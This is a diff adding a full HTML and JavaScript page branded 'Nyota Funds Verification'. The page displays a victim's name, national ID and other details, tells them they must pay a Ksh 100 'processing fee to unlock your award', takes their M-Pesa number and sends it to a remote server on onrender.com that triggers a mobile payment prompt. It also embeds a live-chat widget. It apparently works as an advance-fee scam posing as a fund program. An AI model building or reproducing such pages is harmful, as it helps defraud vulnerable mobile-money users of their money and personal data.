@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Nyota Funds Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<style>
+  @media(max-width: 480px){
+    body {
+      zoom: 0.8; 
+    }
+    .card {
+      transform: scale(0.9); 
+      transform-origin: top; 
+    }
+  }
+  /* Reset & Base styles */
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    background: linear-gradient(135deg, #a8e063, #56ab2f);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    color: #333;
+  }
+
+  h1 {
+    font-size: 2em;
+    text-align: center;
+    margin-bottom: 20px;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.02); }
+  }
+
+  .main-container {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .avatar-wrapper {
+    margin-top: 10px;
+    margin-bottom: 20px;
+    cursor: pointer;
+    transition: transform 0.3s, box-shadow 0.3s;
+    animation: bounceIn 1s ease-out;
+  }
+  .avatar-wrapper:hover {
+    transform: scale(1.1);
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  }
+  .avatar-box {
+    width: 80px;
+    height: 80px;
+    background-color: #E9EBEE;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border: 3px solid #4CAF50;
+    padding: 5px;
+  }
+  .avatar-box svg {
+    width: 60px;
+    height: 60px;
+  }
+
+  @keyframes bounceIn {
+    0% { opacity: 0; transform: scale(0.5); }
+    60% { opacity: 1; transform: scale(1.05); }
+    80% { transform: scale(0.95); }
+    100% { transform: scale(1); }
+  }
+
+  .profile-section {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    background: #fff;
+    border-radius: 20px;
+    padding: 10px 8px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    width: 90%;
+    max-width: 400px;
+    margin-bottom: 30px;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+  }
+  .profile-section:hover {
+    box-shadow: 0 12px 25px rgba(0,0,0,0.3);
+    transform: translateY(-2px);
+  }
+
+  .profile-title {
+    font-family: 'Raleway', sans-serif;
+    font-weight: 700;
+    font-size: 1.5em;
+    color: #2e7d32;
+    margin-bottom: 12px;
+    text-align: center;
+    letter-spacing: 1px;
+  }
+
+  #profileInfo {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .info-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+    padding: 8px 12px;
+    border-radius: 8px;
+    background: rgba(76, 175, 80, 0.1);
+    font-family: 'Raleway', sans-serif;
+    font-weight: 600;
+    font-size: 1em;
+    color: #333;
+    border-left: 4px solid transparent;
+    transition: all 0.3s ease;
+  }
+
+  .info-item:hover {
+    background: rgba(76, 175, 80, 0.2);
+    border-left: 4px solid #4CAF50;
+    box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
+    transform: translateY(-1px);
+  }
+
+  .info-label {
+    font-weight: 700;
+    margin-right: 10px;
+    min-width: 140px;
+    color: #2e7d32;
+  }
+
+  .info-value {
+    flex: 1;
+    text-align: right;
+    font-family: 'Raleway', sans-serif;
+    font-weight: bold;
+    color: #000;
+    font-size: 1.2em;
+  }
+
+  .payment-section {
+    background: #fff;
+    border-radius: 20px;
+    padding: 40px 30px;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    margin-top: 50px;
+    animation: fadeInUp 1s ease-out;
+    box-sizing: border-box;
+  }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .payment-section h3 {
+    margin-bottom: 20px;
+    font-size: 2em;
+    text-align: center;
+    color: #2e7d32;
+  }
+  .payment-info {
+    margin-bottom: 20px;
+    font-size: 1.2em;
+    text-align: center;
+    color: #333;
+  }
+  .input-group {
+    margin-bottom: 15px;
+    text-align: left;
+  }
+  .input-group label {
+    display: block;
+    font-weight: 700;
+    margin-bottom: 5px;
+    color: #2e7d32;
+  }
+  
+  .phone-input-container {
+    display: flex;
+    border: 2px solid #ccc;
+    border-radius: 10px;
+    overflow: hidden;
+    background: #f8fafc;
+    transition: border-color 0.2s ease;
+  }
+  .phone-input-container:focus-within {
+    border-color: #4CAF50;
+  }
+  .country-prefix {
+    background: #e2e8f0;
+    color: #475569;
+    padding: 12px 15px;
+    font-size: 1em;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    border-right: 2px solid #ccc;
+    user-select: none;
+  }
+  .phone-field {
+    flex: 1;
+    border: none;
+    background: transparent;
+    padding: 12px 15px;
+    font-size: 1em;
+    color: #333;
+    outline: none;
+  }
+
+  input[type="text"] {
+    width: 100%;
+    padding: 12px 15px;
+    border-radius: 10px;
+    border: 2px solid #ccc;
+    font-size: 1em;
+    outline: none;
+    transition: border-color 0.3s, box-shadow 0.2s;
+    box-sizing: border-box;
+  }
+  input[type="text"]:focus {
+    border-color: #4CAF50;
+    box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+  }
+  .pay-btn {
+    width: 100%;
+    padding: 15px;
+    background: #e2e8f0;
+    color: #94a3b8;
+    font-size: 1.4em;
+    border: none;
+    border-radius: 12px;
+    cursor: not-allowed;
+    transition: background 0.3s, transform 0.2s;
+    font-weight: bold;
+    margin-top: 15px;
+  }
+  .pay-btn.active {
+    background: #4CAF50;
+    color: #fff;
+    cursor: pointer;
+  }
+  .pay-btn.active:hover {
+    background: #388e3c;
+    transform: translateY(-2px);
+  }
+
+  .floating-icons {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    display: flex;
+    gap: 15px;
+    font-size: 2em;
+    color: #fff;
+    animation: float 3s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  #phone-error {
+    color: #ff3b30;
+    font-size: 13px;
+    text-align: left;
+    margin-top: 6px;
+    display: none;
+    font-weight: 500;
+  }
+  .sub-instruction {
+    font-size: 12px;
+    color: #666;
+    text-align: left;
+    margin-top: 6px;
+  }
+
+  /* Processing window overlay */
+  #processingModal {
+    display: none; 
+    position: fixed; 
+    top: 0; 
+    left: 0; 
+    width: 100%; 
+    height: 100%; 
+    background: rgba(255, 255, 255, 0.98); 
+    justify-content: center; 
+    align-items: center; 
+    z-index: 9999;
+  }
+  .modal-card {
+    background: transparent; 
+    padding: 30px; 
+    text-align: center;
+    max-width: 350px;
+    width: 85%;
+  }
+
+  .spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #1fb141;
+    border-radius: 50%;
+    width: 45px;
+    height: 45px;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 20px auto;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<h1>Nyota Funds Verification</h1>
+
+<div id="dataSummaryContainer" style="width:100%; max-width:1000px; margin:auto; padding:10px;"></div>
+
+<div class="main-container" id="mainContainer">
+  <div class="profile-section">
+    <div class="avatar-wrapper" id="avatarWrapper" title="Click to change color!">
+      <div class="avatar-box" id="avatarBox">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet">
+          <circle cx="50" cy="35" r="20" fill="#FFFFFF"/>
+          <path d="M10 90 C10 60, 90 60, 90 90 L90 100 L10 100 Z" fill="#FFFFFF"/>
+        </svg>
+      </div>
+    </div>
+    
+    <div class="profile-title">Nyota Profile</div>
+    <div id="profileInfo">
+      <div class="info-item">
+        <div class="info-label">Client Name:</div>
+        <div class="info-value" id="name"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Contact Number:</div>
+        <div class="info-value" id="phone"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">National ID:</div>
+        <div class="info-value" id="idNumber"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Residence County:</div>
+        <div class="info-value" id="county"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Age:</div>
+        <div class="info-value" id="age"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Processing Fee:</div>
+        <div class="info-value" style="display:flex; align-items:center;">
+          <span style="color: orange; font-weight: 700;">Pending</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="payment-section">
+    <h3>Payment to Unlock Your Award</h3>
+    <div class="payment-info">
+      You're required to pay Ksh <span id="amountDisplay">100</span> processing fee to unlock your award.
+    </div>
+    <div class="input-group">
+      <label for="fullNames">Full Names</label>
+      <input type="text" id="fullNames" placeholder="Enter your full names" />
+    </div>
+    <div class="input-group">
+      <label for="mpesaNumber">Mpesa Number</label>
+      <div class="phone-input-container">
+        <div class="country-prefix">254</div>
+        <input type="tel" id="mpesaNumber" class="phone-field" placeholder="7XXXXXXXX" maxlength="10">
+      </div>
+      <div id="phone-error">Invalid format. Must be 07xxxxxxxx or 01xxxxxxxx</div>
+      <div class="sub-instruction" id="inputHint">Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)</div>
+    </div>
+    <button class="pay-btn" id="payNow" disabled>Pay Now</button>
+  </div>
+</div>
+
+<div class="floating-icons">
+  <i class="fas fa-shield-alt"></i>
+  <i class="fas fa-star"></i>
+  <i class="fas fa-thumbs-up"></i>
+</div>
+
+<div id="processingModal">
+  <div class="modal-card">
+    <div class="spinner"></div>
+    <h3 id="processingText" style="font-size: 18px; font-weight: 700; margin: 0 0 8px 0;">SENDING STK PUSH...</h3>
+    <p id="sub-status" style="color: #666; font-size: 13px; margin: 0;">Please check your phone for the M-Pesa prompt</p>
+  </div>
+</div>
+
+<script>
+  // ENDPOINT CONFIGURATION TOGGLE
+  // If your server uses /topup change this to '/topup', if it uses /pay change this to '/pay'
+  const ENDPOINT_PATH = '/pay'; 
+
+  const defaultData = {
+    first_name: "Jane",
+    phone_number: "0712345678",
+    id_number: "12345678",
+    county: "Kisumu",
+    age: "32"
+  };
+  const userData = JSON.parse(localStorage.getItem('nyota_finalData')) || defaultData;
+
+  document.getElementById('name').innerText = userData.first_name;
+  document.getElementById('phone').innerText = userData.phone_number;
+  document.getElementById('idNumber').innerText = userData.id_number;
+  document.getElementById('county').innerText = userData.county;
+  document.getElementById('age').innerText = userData.age;
+
+  const selectedFundData = localStorage.getItem('selectedFund');
+  let feeAmount = '100';
+  if (selectedFundData) {
+    try {
+      const selectedFund = JSON.parse(selectedFundData);
+      feeAmount = selectedFund.fee || '100';
+    } catch (e) {
+      console.error('Error parsing selectedFund:', e);
+    }
+  }
+  document.getElementById('amountDisplay').innerText = feeAmount;
+
+  const mpesaInput = document.getElementById('mpesaNumber');
+  const fullNamesInput = document.getElementById('fullNames');
+  const payButton = document.getElementById('payNow');
+  const modal = document.getElementById('processingModal');
+  const processingText = document.getElementById('processingText');
+  const subStatusText = document.getElementById('sub-status');
+  const phoneError = document.getElementById('phone-error');
+  const inputHint = document.getElementById('inputHint');
+
+  function validateInputs() {
+    let rawValue = mpesaInput.value.trim();
+    let testValue = rawValue;
+    if (rawValue.startsWith('0')) {
+      testValue = rawValue;
+    } else if (rawValue.startsWith('7') || rawValue.startsWith('1')) {
+      testValue = '0' + rawValue;
+    }
+
+    const isPhoneValid = /^(07|01)\d{8}$/.test(testValue);
+    const isNameFilled = fullNamesInput.value.trim() !== '';
+
+    if (rawValue.length >= 9) {
+      if (!isPhoneValid) {
+        phoneError.style.display = "block";
+        inputHint.style.display = "none";
+        payButton.classList.remove('active');
+        payButton.disabled = true;
+      } else {
+        phoneError.style.display = "none";
+        inputHint.style.display = "block";
+        if (isNameFilled) {
+          payButton.classList.add('active');
+          payButton.disabled = false;
+        } else {
+          payButton.classList.remove('active');
+          payButton.disabled = true;
+        }
+      }
+    } else {
+      phoneError.style.display = "none";
+      inputHint.style.display = "block";
+      payButton.classList.remove('active');
+      payButton.disabled = true;
+    }
+  }
+
+  fullNamesInput.addEventListener('input', validateInputs);
+  mpesaInput.addEventListener('input', validateInputs);
+
+  payButton.addEventListener('click', async () => {
+    modal.style.display = 'flex';
+    processingText.innerText = "SENDING STK PUSH... ";
+    processingText.style.color = "#ff9900";
+    subStatusText.style.display = "block";
+    subStatusText.innerText = "Please check your phone for the M-Pesa prompt";
+
+    let formattedNumber = mpesaInput.value.trim();
+    if (formattedNumber.startsWith('0')) {
+        formattedNumber = '254' + formattedNumber.substring(1);
+    } else if (formattedNumber.startsWith('7') || formattedNumber.startsWith('1')) {
+        formattedNumber = '254' + formattedNumber;
+    }
+
+    const amount = Number(document.getElementById('amountDisplay').innerText.trim());
+
+    const payload = {
+      phone: formattedNumber,
+      amount: amount
+    };
+
+    try {
+      const response = await fetch(`https://server100-847a.onrender.com${ENDPOINT_PATH}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      // HTML Safe Catch: Ensure it's JSON before we try parsing it
+      const contentType = response.headers.get("content-type");
+      if (!contentType || !contentType.includes("application/json")) {
+        throw new Error(`Server returned HTML instead of JSON. Check if route '${ENDPOINT_PATH}' is correct.`);
+      }
+
+      const data = await response.json();
+
+      if (response.ok && data.success === true) {
+        if (data.status === "completed") {
+          processingText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
+          processingText.style.color = "#1fb141";
+          subStatusText.style.display = "none";
+          setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
+        } 
+        else if (data.status === "pending") {
+          const checkoutId = data.checkout_request_id;
+          if (!checkoutId) throw new Error("Missing transaction tracking reference from gateway.");
+
+          localStorage.setItem("request_id", checkoutId);
+
+          let finalData = JSON.parse(localStorage.getItem('nyota_finalData')) || {};
+          finalData.reference_id = checkoutId;
+          localStorage.setItem('nyota_finalData', JSON.stringify(finalData));
+
+          processingText.innerText = "PROMPT SENT! REDIRECTING...";
+          processingText.style.color = "#1fb141";
+          subStatusText.innerText = "Preparing secure tracking window...";
+
+          setTimeout(() => {
+            window.location.href = 'processing.html';
+          }, 1500);
+        }
+      } else {
+        throw new Error(data.message || "Invalid response structure from backend gateway.");
+      }
+
+    } catch (error) {
+      processingText.innerText = "ERROR";
+      processingText.style.color = "#ff3b30";
+      subStatusText.style.color = "#ff3b30";
+      subStatusText.innerText = error.message;
+      setTimeout(() => {
+        modal.style.display = 'none';
+      }, 5000); // Gives you 5 seconds to view the exact diagnostic failure message safely
+    }
+  });
+
+  const avatarColors = ['#E9EBEE', '#dfe3ee', '#8b9dc3', '#3b5998'];
+  let colorIdx = 0;
+  document.getElementById('avatarWrapper').addEventListener('click', () => {
+    colorIdx = (colorIdx + 1) % avatarColors.length;
+    document.getElementById('avatarBox').style.backgroundColor = avatarColors[colorIdx];
+  });
+</script>
+
+<script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 19602038;
+    window.__lc.integration_name = "manual_channels";
+    window.__lc.product_name = "livechat";
+    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+<noscript><a href="https://www.livechat.com/chat-with/19602038/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+</body>
+</html>
